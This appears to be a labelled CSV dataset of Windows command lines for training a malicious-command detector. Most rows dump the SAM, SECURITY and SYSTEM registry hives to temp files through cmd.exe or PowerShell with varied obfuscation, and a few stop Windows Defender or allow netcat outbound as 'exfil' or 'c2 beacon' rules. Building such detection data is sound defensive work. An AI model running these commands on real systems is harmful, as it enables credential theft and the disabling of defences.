text,label
"cmd.exe /c ""reg export hklm\security c:\windows\temp\tqz2en4x.save""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\7l11x3au.dat""",1
reg export hklm\system c:\windows\temp\icghja1l.save,1
reg   export   hklm\sam   c:\windows\temp\67t1k8rh.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\1j982rtd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\skftnfrv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4gce27c5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\a6pj2d7o.dat""",1
reg save hklm\sam c:\windows\temp\pm3byfnh.save,1
reg export hklm\security c:\windows\temp\3qzdlh3n.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\phzwev1l.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\w92bjsln.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\dw8u7w34.dat""",1
reg export hklm\security c:\windows\temp\ubtqmwnc.save,1
reg save hklm\sam c:\windows\temp\i65t286c.save,1
reg save hklm\sam c:\windows\temp\42qnkalg.save,1
reg export hklm\sam c:\windows\temp\rmeg3z1h.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\o0g0o1e9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\8y97nupw.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\nkmbbswa.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ohrpcuz7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\stumpzqk.save""",1
reg save hklm\sam c:\windows\temp\ypv01x4x.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\p1eknh5x.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\e6lsd0hc.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\va4x0s1q.save""",1
reg export hklm\sam c:\windows\temp\mxl0hzjr.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\8l6anc10.dat""",1
reg save hklm\security c:\windows\temp\noh8l31w.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\8hc8oopg.dat""",1
reg save hklm\sam c:\windows\temp\3bzcvpv7.save,1
reg save hklm\system c:\windows\temp\dhgbhx19.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8mbm9ood.dat""",1
reg save hklm\system c:\windows\temp\kq15bp3m.save,1
reg save hklm\security c:\windows\temp\fyjelddu.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\z5vswx0v.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\o8uj35mx.dat""""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\b1p3555q.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\57o2eaj8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rscam8ic.dat""",1
reg  export  hklm\security  c:\windows\temp\tdd9juxj.save,1
reg export hklm\system c:\windows\temp\q9rwtkgn.save,1
reg export hklm\sam c:\windows\temp\p5hkslx5.save,1
reg export hklm\security c:\windows\temp\buwy3lo2.save,1
reg export hklm\sam c:\windows\temp\uf8sdm4i.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\qi6hjk22.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nmiuqhhe.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\kqn00e8d.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\hqrwni5z.dat""",1
reg export hklm\system c:\windows\temp\lcsx305h.save,1
reg save hklm\system c:\windows\temp\68414syd.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\4lwro7mw.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\h5qfotcb.dat""",1
reg save hklm\sam c:\windows\temp\n0zqeo6u.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vj1hrnn9.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\sv1h1pu8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3bqgvmel.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\14rpjuuh.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hj8gafr2.dat""",1
reg save hklm\security c:\windows\temp\e990qe0u.save,1
reg  save  hklm\sam  c:\windows\temp\t7s682kq.save,1
reg export hklm\security c:\windows\temp\93w2wfrr.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\p55cc17o.dat""",1
reg export hklm\sam c:\windows\temp\fnkw3cs7.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7ugmhh7k.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\srl208kg.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vtpo5obn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\lo1k3fv1.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\bhaovrpc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\mc132owm.dat""",1
reg export hklm\sam c:\windows\temp\kxjkutq5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\4usat9ib.dat""",1
reg export hklm\security c:\windows\temp\78h45kmo.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\glsucx6q.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a67wzexd.dat""",1
reg export hklm\sam c:\windows\temp\my31kcll.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\vwltnes3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3ti2hq1l.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\0cco6asm.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ajpmkuoh.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fnk3m1na.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\l14n5fec.dat""",1
reg export hklm\system c:\windows\temp\ylwaa3h0.save,1
reg export hklm\security c:\windows\temp\fspyoegs.save,1
"powershell -nop -c ""sc  stop  windefend""",2
reg  save  hklm\sam  c:\windows\temp\hae50ovj.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\3nc5302z.dat""",1
reg export hklm\system c:\windows\temp\kodqagnl.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\90iga22z.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\48af3xza.dat""",1
reg export hklm\security c:\windows\temp\fabtohug.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\v6idgi7c.dat""""",1
reg export hklm\sam c:\windows\temp\7sgddov4.save,1
reg save hklm\security c:\windows\temp\9bw6vx81.save,1
"cmd.exe /c ""reg query hkcu\console""",0
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\7e5gx4e8.save""",1
reg save hklm\security c:\windows\temp\axhbm7wf.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\m7k4qoim.dat""",1
reg export hklm\sam c:\windows\temp\a3e64i4r.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\uyv0vn69.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\rsvsopwr.dat""",1
reg export hklm\system c:\windows\temp\ohgfn2zf.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\6bd3ousj.dat""",1
reg export hklm\sam c:\windows\temp\p9y4v4b8.save,1
reg  export  hklm\security  c:\windows\temp\vxxukhww.save,1
reg save hklm\sam c:\windows\temp\ddh7dcmy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8c1fyer7.dat""",1
reg save hklm\system c:\windows\temp\to6ukq0g.save,1
reg save hklm\security c:\windows\temp\z38ew5es.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\ubah64ai.save""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\o26p44ju.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vkzhfaqj.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9wa1dchl.dat""",1
reg save hklm\security c:\windows\temp\5g4gyxp0.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yy54re4a.dat""",1
reg export hklm\system c:\windows\temp\gt17bdei.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5fr6pskp.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rwv5xc2i.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jdz2nbt1.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\lvtpfc2h.dat""""",1
reg export hklm\security c:\windows\temp\0ide3bp7.save,1
reg save hklm\security c:\windows\temp\rzqlnp3p.save,1
reg export hklm\security c:\windows\temp\29g0x5sq.save,1
reg export hklm\sam c:\windows\temp\rlhxg1s9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\998kijtj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ewu103ix.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iuyt0stp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1xj5yc1m.dat""",1
reg export hklm\security c:\windows\temp\y4cyxd57.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\y89o3o01.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\mkgfozqs.dat""",1
reg export hklm\system c:\windows\temp\4hs9mhgx.save,1
reg save hklm\security c:\windows\temp\qyulca9v.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\g1qynano.dat""",1
reg save hklm\system c:\windows\temp\eaym2s2x.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\jdykye9g.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\92qlbrqo.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\s0ckt6fp.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\oqqn480v.dat""",1
reg export hklm\sam c:\windows\temp\d0cb3hzl.save,1
reg save hklm\sam c:\windows\temp\rbojfpuw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\yauxpdup.dat""",1
reg save hklm\sam c:\windows\temp\fk1340n9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dpncm4a7.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zvuvl225.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rz3v13oa.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\enk8puvv.dat""",1
reg  export  hklm\security  c:\windows\temp\z48xmstm.save,1
reg save hklm\security c:\windows\temp\jvmc6t1g.save,1
reg export hklm\system c:\windows\temp\w5c25a2j.save,1
reg save hklm\system c:\windows\temp\4im1owhk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wj1t8p18.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\1ic6rmhm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\l4cyf0nj.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vs9obx46.dat""",1
reg export hklm\system c:\windows\temp\rkqmsyo7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\i47oa5pf.dat""",1
"powershell -nop -c ""reg  query  hkcu\console""",0
"powershell -nop -c ""reg save hklm\security c:\temp\rb5lazde.dat""",1
reg save hklm\sam c:\windows\temp\98h71l8e.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\b23pe7wx.save""",1
reg save hklm\sam c:\windows\temp\mlx7cxvr.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\h32sapk8.dat""""",1
reg save hklm\system c:\windows\temp\51rlwvoy.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ws43la0z.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1nvzh4h7.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\zw945wsu.dat""",1
reg export hklm\system c:\windows\temp\hwfype5o.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\nt5romiq.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\bh1rvyw8.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bjlwmk3q.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tgeh8icr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\tqk5tps9.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8znflydq.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5wybar3f.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\g4wqbii6.dat""",1
reg export hklm\system c:\windows\temp\oeo4u2yb.save,1
reg export hklm\sam c:\windows\temp\nuwqq3go.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\wke7f8jt.dat""",1
reg export hklm\system c:\windows\temp\pz7ovpz6.save,1
reg export hklm\sam c:\windows\temp\280rn9zh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\a490vujg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wyikyhfl.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\t9kd8zvo.dat""""",1
reg export hklm\system c:\windows\temp\nofbuc9d.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\thgg8irx.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\staq4h4n.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\mm2ptaci.dat""",1
reg save hklm\security c:\windows\temp\49p9dls7.save,1
reg export hklm\system c:\windows\temp\dst0nb4v.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lbzjywfz.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\cj1zrtoe.dat""""",1
reg save hklm\sam c:\windows\temp\d4ouz5fq.save,1
reg export hklm\sam c:\windows\temp\iqfeoloa.save,1
reg save hklm\security c:\windows\temp\d3dnox4y.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1203zxq4.dat""",1
reg export hklm\security c:\windows\temp\oqy94llu.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\g14z1tf4.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\b8g7c19m.dat""""",1
reg save hklm\sam c:\windows\temp\4mnt1d0t.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\etrlmqvf.dat""",1
reg  save  hklm\system  c:\windows\temp\tqj3pyis.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\8diq5l73.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\36g12pe3.dat""",1
reg export hklm\system c:\windows\temp\gjpe44u2.save,1
reg save hklm\security c:\windows\temp\8ma8ze78.save,1
reg  export  hklm\sam  c:\windows\temp\j9jsj6bh.save,1
reg save hklm\system c:\windows\temp\nkdv51ds.save,1
reg save hklm\security c:\windows\temp\eupprwlk.save,1
reg export hklm\system c:\windows\temp\6gxwniqy.save,1
reg save hklm\system c:\windows\temp\muiv4pjq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\smt3p3uh.dat""",1
reg export hklm\system c:\windows\temp\v72d927c.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ntjng7xi.dat""",1
reg export hklm\sam c:\windows\temp\o0zhnwec.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\obp0g577.dat""",1
reg export hklm\sam c:\windows\temp\w2pmm9yb.save,1
reg save hklm\system c:\windows\temp\q2jkl0jy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\287b2k0c.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lus9c33p.dat""",1
reg export hklm\system c:\windows\temp\554kjf8u.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\rkdrfryk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wa2z6ekr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\upd587ui.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\gxze580g.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\yr4f314u.dat""""",1
reg save hklm\system c:\windows\temp\dquwn8fg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4m6aok2w.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6x761ukv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\bj5r0tl3.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\e9ac8mrs.save,1
reg save hklm\system c:\windows\temp\hk182y0q.save,1
reg save hklm\system c:\windows\temp\3dliq4n0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\x98ewdwz.dat""",1
reg   save   hklm\system   c:\windows\temp\gu298mtv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pftgqzeg.dat""",1
reg export hklm\sam c:\windows\temp\f2e7yi7q.save,1
reg export hklm\system c:\windows\temp\ycrcf27r.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8bp7aeuy.dat""",1
reg save hklm\security c:\windows\temp\22mlnx5l.save,1
reg export hklm\system c:\windows\temp\146a9vea.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\gmi4o6ry.dat""",1
reg save hklm\security c:\windows\temp\g8wx74dx.save,1
reg save hklm\security c:\windows\temp\k4etwmn2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\hph1sec1.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\pj1j182o.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\aoaid88z.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2m9yp0bm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mpr5b2hv.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qylrsuzg.dat""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\fup6ohmp.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a39o3g86.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\osn59u2w.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\k5xajefn.dat""",1
reg save hklm\system c:\windows\temp\6kercfxx.save,1
reg export hklm\system c:\windows\temp\nl11w382.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\v8u3lx2r.dat""",1
reg export hklm\sam c:\windows\temp\ugzfsdir.save,1
reg export hklm\security c:\windows\temp\io27hg3p.save,1
reg export hklm\system c:\windows\temp\z2sw8fqr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\j3f3p8bf.dat""",1
reg  export  hklm\security  c:\windows\temp\rxqgesvh.save,1
reg   save   hklm\sam   c:\windows\temp\vhgb7xp7.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\63ywj4vv.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\vif1s60q.dat""",1
reg save hklm\security c:\windows\temp\aihvvum0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b3lpw33e.dat""",1
reg export hklm\security c:\windows\temp\nmzur6we.save,1
reg save hklm\sam c:\windows\temp\j1i9b8cj.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jj9hzptm.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\z8n1rh7v.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\twlanigr.save""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\w0uvnz4a.dat""""",1
reg save hklm\system c:\windows\temp\ffyi5n5d.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\7iivd19y.save""",1
reg save hklm\system c:\windows\temp\mc6senqy.save,1
reg save hklm\sam c:\windows\temp\rvvmrvov.save,1
reg save hklm\system c:\windows\temp\qpkbwwju.save,1
reg export hklm\system c:\windows\temp\040smkk3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\qnyxh5zs.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\aiyi2zyb.dat""",1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\5m5omw3t.save""",1
reg export hklm\security c:\windows\temp\bt6utvfp.save,1
reg export hklm\system c:\windows\temp\sg5kvw66.save,1
reg save hklm\sam c:\windows\temp\042xqgy8.save,1
reg export hklm\security c:\windows\temp\994t4lqw.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\a5o7e7w1.dat""",1
reg export hklm\sam c:\windows\temp\ncd8dtjf.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\pe5q13gn.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\aphdiby9.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ibvdvahb.dat""""",1
reg export hklm\system c:\windows\temp\2eutle6s.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\9cs0rec9.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\at7rgwto.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\u3r7o8k7.save""",1
reg save hklm\security c:\windows\temp\6j82dtxv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\xlo154zx.dat""",1
reg save hklm\system c:\windows\temp\jsu1zps1.save,1
reg export hklm\sam c:\windows\temp\am4gqgcc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\74j9pdds.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ety13q8y.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\ve31g39g.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hspersng.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\8tbbsoq8.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\opo2s5ij.dat""",1
reg save hklm\security c:\windows\temp\z55mymop.save,1
reg save hklm\sam c:\windows\temp\xtvcu2k9.save,1
reg export hklm\system c:\windows\temp\kxo1maf8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tv9up2gi.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\eqwqzhoc.dat""",1
reg save hklm\system c:\windows\temp\d2cqivsz.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\cbo25p65.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ueuh3pv5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\a49opkq2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pbyw4xn7.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\wl79s3vv.dat""""",1
reg export hklm\security c:\windows\temp\xwpwommr.save,1
reg save hklm\sam c:\windows\temp\98hlmj2a.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\bgrjw9a5.dat""",1
reg save hklm\sam c:\windows\temp\c30zeqnf.save,1
reg save hklm\security c:\windows\temp\cm6uaqfx.save,1
reg save hklm\security c:\windows\temp\x1j72ak9.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\6maa7cex.dat""""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\xar2d69h.dat""",1
reg export hklm\system c:\windows\temp\627709js.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\s0gdvmsn.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0zj7x31d.dat""",1
reg save hklm\sam c:\windows\temp\j9z4kk5p.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\pu2pbhcp.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qnm52ciw.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mv64pz1w.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cx3pqppk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fn9gm4hg.dat""",1
reg export hklm\system c:\windows\temp\rv4gy1gu.save,1
reg export hklm\sam c:\windows\temp\bmj11rfx.save,1
reg export hklm\sam c:\windows\temp\ophlqaen.save,1
